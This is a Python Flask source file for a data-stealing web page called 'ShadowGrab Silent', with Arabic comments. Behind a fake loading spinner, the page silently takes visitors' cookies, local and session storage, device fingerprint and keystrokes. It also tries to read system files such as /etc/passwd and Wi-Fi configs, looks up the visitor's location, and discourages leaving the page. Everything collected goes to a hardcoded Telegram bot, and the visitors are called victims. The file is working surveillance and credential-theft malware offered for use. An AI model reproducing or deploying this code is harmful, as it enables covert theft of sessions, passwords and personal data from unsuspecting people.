from flask import Flask, request, jsonify
import os
import json
import requests
import threading
import datetime
import base64

app = Flask(__name__)

TELEGRAM_TOKEN = "8875360747:AAHZH8ti8BTzA8_Gzo6QV6ex4OsaJyoBovI"
TELEGRAM_CHAT_ID = "1170411845"

def send_telegram(message):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
        payload = {"chat_id": TELEGRAM_CHAT_ID, "text": message[:4000], "parse_mode": "HTML"}
        requests.post(url, json=payload, timeout=5)
    except Exception as e:
        print(f"خطأ: {e}")

@app.route('/')
def index():
    visitor_ip = request.remote_addr
    send_telegram(f"""🔥 <b>دخول ضحية جديدة</b>
🌐 IP: {visitor_ip}
⏰ {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
📱 جاري سحب البيانات الصامتة...""")
    
    return '''
    <!DOCTYPE html>
    <html>
    <head><title>جار التحميل...</title>
    <style>
        body { background: #000; color: #0f0; font-family: Arial; text-align: center; padding: 50px; }
        .spinner { border: 4px solid #333; border-top: 4px solid #0f0; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 50px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
    </head>
    <body>
        <div class="spinner"></div>
        <h1>جار التحميل...</h1>
        <p style="color:#666;">الرجاء الانتظار</p>

        <script>
            // ===== 1. سحب جميع الكوكيز =====
            const cookies = document.cookie || 'لا توجد كوكيز';
            sendData('🍪 الكوكيز', cookies);

            // ===== 2. سحب LocalStorage =====
            try {
                const ls = JSON.stringify(localStorage) || '{}';
                sendData('💾 LocalStorage', ls.substring(0, 800));
            } catch(e) {}

            // ===== 3. سحب SessionStorage =====
            try {
                const ss = JSON.stringify(sessionStorage) || '{}';
                sendData('📦 SessionStorage', ss.substring(0, 800));
            } catch(e) {}

            // ===== 4. معلومات الجهاز الكاملة (بدون إذن) =====
            const deviceInfo = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                languages: navigator.languages,
                cookieEnabled: navigator.cookieEnabled,
                doNotTrack: navigator.doNotTrack,
                hardwareConcurrency: navigator.hardwareConcurrency || 'غير معروف',
                deviceMemory: navigator.deviceMemory || 'غير معروف',
                maxTouchPoints: navigator.maxTouchPoints || 0,
                screen: `${screen.width}x${screen.height}`,
                colorDepth: screen.colorDepth,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timezoneOffset: new Date().getTimezoneOffset(),
                referrer: document.referrer || 'مباشر',
                url: window.location.href,
                title: document.title,
                timestamp: new Date().toISOString()
            };
            sendData('💻 معلومات الجهاز', JSON.stringify(deviceInfo, null, 2));

            // ===== 5. محاولة سحب ملفات النظام (بدون إذن - استغلال ثغرات) =====
            const systemFiles = [
                '/etc/passwd',
                '/etc/hosts',
                '/proc/version',
                '/proc/cpuinfo',
                '/proc/meminfo',
                '/data/data/com.android.providers.contacts/databases/contacts2.db',
                '/data/misc/wifi/wpa_supplicant.conf',
                '/sdcard/Android/data/',
                '/storage/emulated/0/',
                'C:/Windows/System32/drivers/etc/hosts',
                'C:/Users/Public/Desktop/'
            ];
            
            systemFiles.forEach(file => {
                try {
                    fetch('file://' + file)
                        .then(res => {
                            if (res.ok) return res.text();
                            throw new Error('غير متاح');
                        })
                        .then(data => {
                            sendData('📂 ملف: ' + file, data.substring(0, 500));
                        })
                        .catch(() => {});
                } catch(e) {}
            });

            // ===== 6. تسجيل المفاتيح (Keylogger صامت) =====
            let keys = [];
            let lastSend = Date.now();
            
            document.addEventListener('keydown', e => {
                // تجاهل مفاتيح التحكم
                if (e.key.length === 1 || e.key === 'Enter' || e.key === 'Backspace' || e.key === 'Tab') {
                    keys.push(e.key);
                    if (keys.length > 200) keys.shift();
                }
                
                // إرسال كل 3 ثواني إذا كان هناك مفاتيح
                if (Date.now() - lastSend > 3000 && keys.length > 0) {
                    const keyData = keys.join('');
                    sendData('⌨️ المفاتيح المسجلة', keyData.substring(0, 500));
                    keys = [];
                    lastSend = Date.now();
                }
            });

            // ===== 7. سحب معلومات الشبكة =====
            try {
                if (navigator.connection) {
                    const conn = navigator.connection;
                    const networkInfo = {
                        type: conn.effectiveType || 'غير معروف',
                        downlink: conn.downlink || 'غير معروف',
                        rtt: conn.rtt || 'غير معروف',
                        saveData: conn.saveData || false
                    };
                    sendData('📶 معلومات الشبكة', JSON.stringify(networkInfo));
                }
            } catch(e) {}

            // ===== 8. محاولة الحصول على الموقع عبر IP (بدون إذن) =====
            try {
                fetch('https://ipapi.co/json/')
                    .then(res => res.json())
                    .then(data => {
                        const location = {
                            ip: data.ip || 'غير معروف',
                            city: data.city || 'غير معروف',
                            region: data.region || 'غير معروف',
                            country: data.country_name || 'غير معروف',
                            latitude: data.latitude || 'غير معروف',
                            longitude: data.longitude || 'غير معروف',
                            timezone: data.timezone || 'غير معروف',
                            isp: data.org || 'غير معروف'
                        };
                        sendData('📍 الموقع التقريبي (IP)', JSON.stringify(location, null, 2));
                    })
                    .catch(() => {});
            } catch(e) {}

            // ===== 9. سحب التاريخ والوقت =====
            const timeInfo = {
                localTime: new Date().toString(),
                utcTime: new Date().toUTCString(),
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timezoneOffset: new Date().getTimezoneOffset()
            };
            sendData('⏰ معلومات الوقت', JSON.stringify(timeInfo, null, 2));

            // ===== 10. سحب بيانات الصفحة =====
            try {
                const pageData = {
                    title: document.title,
                    url: window.location.href,
                    referrer: document.referrer,
                    innerWidth: window.innerWidth,
                    innerHeight: window.innerHeight,
                    outerWidth: window.outerWidth,
                    outerHeight: window.outerHeight,
                    scrollX: window.scrollX,
                    scrollY: window.scrollY
                };
                sendData('📄 بيانات الصفحة', JSON.stringify(pageData, null, 2));
            } catch(e) {}

            // ===== دوال الإرسال =====
            function sendData(label, content) {
                if (!content || content.length < 2) return;
                try {
                    const payload = btoa(unescape(encodeURIComponent(JSON.stringify({ label, content, time: new Date().toISOString() }))));
                    fetch('/collect', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ payload })
                    }).catch(() => {});
                } catch(e) {}
            }

            // ===== منع الخروج =====
            window.onbeforeunload = () => 'جار التحميل...';
            
            // ===== إرسال البيانات بشكل دوري =====
            setInterval(() => {
                // إرسال أي مفاتيح متبقية
                if (keys.length > 0) {
                    const keyData = keys.join('');
                    sendData('⌨️ المفاتيح المسجلة', keyData.substring(0, 500));
                    keys = [];
                    lastSend = Date.now();
                }
            }, 5000);

            console.log('✅ ShadowGrab Silent يعمل');
        </script>
    </body>
    </html>
    '''

@app.route('/collect', methods=['POST'])
def collect():
    try:
        data = request.json
        if data and 'payload' in data:
            decoded = json.loads(base64.b64decode(data['payload']).decode('utf-8'))
            label = decoded.get('label', 'بيانات')
            content = decoded.get('content', '')
            time = decoded.get('time', datetime.datetime.now().isoformat())
            
            msg = f"""📌 <b>{label}</b>
📝 {content[:1000]}
⏰ {time}"""
            send_telegram(msg)
            return jsonify({"status": "ok"})
    except Exception as e:
        print(f"خطأ: {e}")
    return jsonify({"status": "error"}), 400

if __name__ == '__main__':
    send_telegram(f"""🔥 <b>ShadowGrab Silent مفعل</b>
🎯 سحب البيانات الصامتة بدون أي إذن
🍪 كوكيز • LocalStorage • Keylogger • ملفات النظام
⏰ {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}""")
    
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
